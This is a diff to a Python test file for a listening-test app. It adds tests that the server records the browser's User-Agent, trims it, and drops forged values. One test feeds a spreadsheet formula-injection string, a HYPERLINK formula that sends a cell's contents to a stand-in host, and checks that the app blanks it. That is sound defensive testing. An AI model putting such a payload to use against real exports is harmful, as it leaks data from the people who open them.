@@ -558,6 +558,8 @@ def test_submit_pair_types_reject_the_same_pair_judged_twice(
 
 # -- metrics ----------------------------------------------------------------
 
+FIREFOX = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
+
 
 def _metrics_config(tmp_path, test_audio_file, fmt="csv", **metrics):
     return {
@@ -570,13 +572,15 @@ def _metrics_config(tmp_path, test_audio_file, fmt="csv", **metrics):
     }
 
 
-def _submit_with_dwell_time(tc, value=2.5):
+def _submit_with_dwell_time(tc, value=2.5, agent=FIREFOX, **extra):
     return tc.post(
         "/api/submit",
+        headers={"User-Agent": agent},
         json={
             "session_id": "s1",
             "test_type": "mos",
             "ratings": [{"stimulus_id": "s001", "rating": 4, "dwell_time": value}],
+            **extra,
         },
     )
 
@@ -587,7 +591,10 @@ def test_config_reports_which_metrics_are_collected(
     """The frontend only measures what the config asked for."""
     config = _metrics_config(tmp_path, test_audio_file, dwell_time=True)
     with _create_app_client(tmp_path, config, monkeypatch) as tc:
-        assert tc.get("/api/config").json()["metrics"] == {"dwell_time": True}
+        assert tc.get("/api/config").json()["metrics"] == {
+            "dwell_time": True,
+            "user_agent": False,
+        }
 
 
 def test_submit_stores_dwell_time_as_a_prefixed_csv_column(
@@ -635,6 +642,88 @@ def test_submit_rounds_dwell_time_to_two_decimals(
     path = next((tmp_path / "results").rglob("*.csv"))
     row = next(csv.DictReader(path.open(encoding="utf-8")))
     assert row["metrics_dwell_time"] == "2.50"
+
+
+def test_submit_stores_the_request_user_agent_after_dwell_time(
+    tmp_path, test_audio_file, monkeypatch
+):
+    config = _metrics_config(
+        tmp_path, test_audio_file, user_agent=True, dwell_time=True
+    )
+    with _create_app_client(tmp_path, config, monkeypatch) as tc:
+        assert _submit_with_dwell_time(tc).status_code == 200
+    path = next((tmp_path / "results").rglob("*.csv"))
+    row = next(csv.DictReader(path.open(encoding="utf-8")))
+    assert list(row)[-2:] == ["metrics_dwell_time", "metrics_user_agent"]
+    assert row["metrics_user_agent"] == FIREFOX
+
+
+def test_submit_stores_the_user_agent_once_per_session_in_json(
+    tmp_path, test_audio_file, monkeypatch
+):
+    """Read once per submission, so it sits beside the forms, not in a record."""
+    config = _metrics_config(
+        tmp_path, test_audio_file, "json", dwell_time=True, user_agent=True
+    )
+    with _create_app_client(tmp_path, config, monkeypatch) as tc:
+        assert _submit_with_dwell_time(tc).status_code == 200
+    path = next((tmp_path / "results").rglob("*.json"))
+    data = json.loads(path.read_text(encoding="utf-8"))
+    assert data["metrics"] == {"user_agent": FIREFOX}
+    assert data["records"][0]["metrics"] == {"dwell_time": 2.5}
+
+
+def test_submit_leaves_the_user_agent_blank_when_the_request_has_none(
+    tmp_path, test_audio_file, monkeypatch
+):
+    config = _metrics_config(tmp_path, test_audio_file, user_agent=True)
+    with _create_app_client(tmp_path, config, monkeypatch) as tc:
+        assert _submit_with_dwell_time(tc, agent="").status_code == 200
+    path = next((tmp_path / "results").rglob("*.csv"))
+    row = next(csv.DictReader(path.open(encoding="utf-8")))
+    assert row["metrics_user_agent"] == ""
+
+
+@pytest.mark.parametrize("prefix", ["=", "+", "-", "@"])
+def test_submit_leaves_out_a_user_agent_a_spreadsheet_would_read_as_a_formula(
+    tmp_path, test_audio_file, monkeypatch, prefix
+):
+    """No browser's starts like this, so it is crafted - and the one free
+    text in the results, where the metadata text fields allow no such value."""
+    config = _metrics_config(tmp_path, test_audio_file, user_agent=True)
+    with _create_app_client(tmp_path, config, monkeypatch) as tc:
+        agent = f'{prefix}HYPERLINK("http://x.example/?"&A1,"click")'
+        assert _submit_with_dwell_time(tc, agent=agent).status_code == 200
+    path = next((tmp_path / "results").rglob("*.csv"))
+    row = next(csv.DictReader(path.open(encoding="utf-8")))
+    assert row["metrics_user_agent"] == ""
+
+
+def test_submit_cuts_a_long_user_agent_to_its_first_512_characters(
+    tmp_path, test_audio_file, monkeypatch
+):
+    """A browser's is a few hundred at most, and the rest would repeat on
+    every row of the CSV."""
+    config = _metrics_config(tmp_path, test_audio_file, user_agent=True)
+    agent = "Mozilla/5.0 " + "x" * 600
+    with _create_app_client(tmp_path, config, monkeypatch) as tc:
+        assert _submit_with_dwell_time(tc, agent=agent).status_code == 200
+    path = next((tmp_path / "results").rglob("*.csv"))
+    row = next(csv.DictReader(path.open(encoding="utf-8")))
+    assert row["metrics_user_agent"] == agent[:512]
+
+
+def test_submit_takes_the_user_agent_from_the_request_not_the_body(
+    tmp_path, test_audio_file, monkeypatch
+):
+    """The page never sends it, so a value in the body is a crafted one."""
+    config = _metrics_config(tmp_path, test_audio_file, user_agent=True)
+    with _create_app_client(tmp_path, config, monkeypatch) as tc:
+        res = _submit_with_dwell_time(tc, agent="", user_agent="x", _user_agent="x")
+        assert res.status_code == 200
+    path = next((tmp_path / "results").rglob("*.csv"))
+    row = next(csv.DictReader(path.open(encoding="utf-8")))
+    assert row["metrics_user_agent"] == ""
 
 
 def test_submit_ignores_an_experiment_id_from_the_client(client, tmp_path):
